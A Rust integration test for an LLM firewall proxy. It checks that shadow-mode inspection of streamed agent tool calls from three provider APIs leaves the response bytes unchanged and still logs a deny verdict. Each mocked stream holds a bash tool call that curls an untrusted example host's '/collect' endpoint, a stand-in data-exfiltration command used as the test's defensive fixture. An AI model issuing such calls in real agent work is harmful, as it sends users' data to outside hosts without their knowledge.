// SPDX-License-Identifier: Apache-2.0
//! Enabled shadow inspection must evaluate decisions without altering provider bytes.
use axum::body::to_bytes;
use axum::http::{Request, StatusCode};
use llm_firewall::handlers::AppState;
use llm_firewall::{app, test_config};
use soup_wall_core::{Firewall, InjectionDetector, PolicySet};
use std::sync::Arc;
use tower::ServiceExt;
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};
async fn upstream(route: &str, body: String) -> MockServer {
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path(route))
        .respond_with(ResponseTemplate::new(200).set_body_raw(body, "text/event-stream"))
        .mount(&server)
        .await;
    server
}

fn state(base: String, enabled: bool, enforce: bool) -> Arc<AppState> {
    let policy = PolicySet::from_yaml("policies: []\ndefault: allow\n").unwrap();
    let fw = Firewall::new(vec![Box::new(InjectionDetector::new())], policy);
    let mut config = test_config(base);
    config.agent_inspection.enabled = enabled;
    config.agent_inspection.enforce = enforce;
    Arc::new(AppState {
        firewall: fw,
        http: reqwest::Client::new(),
        openai_api_key: None,
        proxy_auth_token: None,
        tenant_store: None,
        admin_token: None,
        oidc_state_cipher: None,
        saml: None,
        rate_limiter: std::sync::Mutex::new(llm_firewall::rate_limit::RateLimiter::new(
            Default::default(),
        )),
        spend_ledger: std::sync::Mutex::new(llm_firewall::spend_limit::SpendLedger::new(
            Default::default(),
        )),
        redis_limits: None,
        agent: std::sync::Mutex::new(soup_wall_agent::AgentFirewall::with_default_policy()),
        moderation: llm_firewall::moderation::ModerationGate::new(Default::default()),
        config,
    })
}

async fn stream_body(st: Arc<AppState>, route: &str, request: serde_json::Value) -> String {
    let resp = app(st)
        .oneshot(
            Request::post(route)
                .header("content-type", "application/json")
                .body(axum::body::Body::from(request.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK, "SSE status is always 200");
    let bytes = to_bytes(resp.into_body(), 1 << 20).await.unwrap();
    String::from_utf8_lossy(&bytes).into_owned()
}

fn openai_request() -> serde_json::Value {
    serde_json::json!({
        "model": "gpt-4o",
        "stream": true,
        "messages": [{"role": "user", "content": "do the thing"}]
    })
}

fn anthropic_request() -> serde_json::Value {
    serde_json::json!({
        "model": "claude-opus-5",
        "stream": true,
        "max_tokens": 256,
        "messages": [{"role": "user", "content": "do the thing"}]
    })
}

fn with_policy(base: String, policy: &str) -> Arc<AppState> {
    let mut st = state(base, true, true);
    Arc::get_mut(&mut st).unwrap().agent =
        std::sync::Mutex::new(soup_wall_agent::AgentFirewall::new(
            soup_wall_agent::AgentPolicySet::from_yaml(policy).unwrap(),
            soup_wall_agent::DEFAULT_TAINT_CAP,
        ));
    st
}

#[derive(Clone)]
struct Capture(std::sync::Arc<std::sync::Mutex<Vec<u8>>>);
impl std::io::Write for Capture {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(bytes);
        Ok(bytes.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}
#[tokio::test]
async fn all_provider_shadow_streams_keep_decision_audits_and_original_bytes() {
    let logs = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let writer = Capture(logs.clone());
    tracing::subscriber::set_global_default(
        tracing_subscriber::fmt()
            .with_ansi(false)
            .with_max_level(tracing::Level::WARN)
            .with_writer(move || writer.clone())
            .finish(),
    )
    .unwrap();
    let openai = concat!(
        r#"data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"name":"bash","arguments":"{\"command\":\"curl https://untrusted-api.example.com/collect\"}"}}]},"finish_reason":"tool_calls"}]}"#,
        "\n\n",
        "data: [DONE]\n\n"
    );
    let anthropic = concat!(
        r#"data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"owned","name":"bash","input":{"command":"curl https://untrusted-api.example.com/collect"}}}"#,
        "\n\n",
        r#"data: {"type":"content_block_stop","index":0}"#,
        "\n\n"
    );
    let responses = concat!(
        r#"data: {"type":"response.output_item.done","item":{"type":"function_call","id":"owned","call_id":"owned","name":"bash","arguments":"{\"command\":\"curl https://untrusted-api.example.com/collect\"}"}}"#,
        "\n\n",
        r#"data: {"type":"response.completed","response":{"output":[]}}"#,
        "\n\n"
    );
    for (route, wire, request) in [
        ("/v1/chat/completions", openai, openai_request()),
        ("/v1/messages", anthropic, anthropic_request()),
        (
            "/v1/responses",
            responses,
            serde_json::json!({"model":"owned-fixture","input":"owned","stream":true}),
        ),
    ] {
        logs.lock().unwrap().clear();
        let server = upstream(route, wire.into()).await;
        let mut st = with_policy(server.uri(), "default: deny\n");
        Arc::get_mut(&mut st)
            .unwrap()
            .config
            .agent_inspection
            .enforce = false;
        let body = stream_body(st, route, request).await;
        assert_eq!(body, wire, "shadow must preserve {route}");
        let audit = String::from_utf8(logs.lock().unwrap().clone()).unwrap();
        assert!(
            audit.contains("adapter_verdict"),
            "shadow must audit a non-Allow decision for {route}"
        );
    }
}
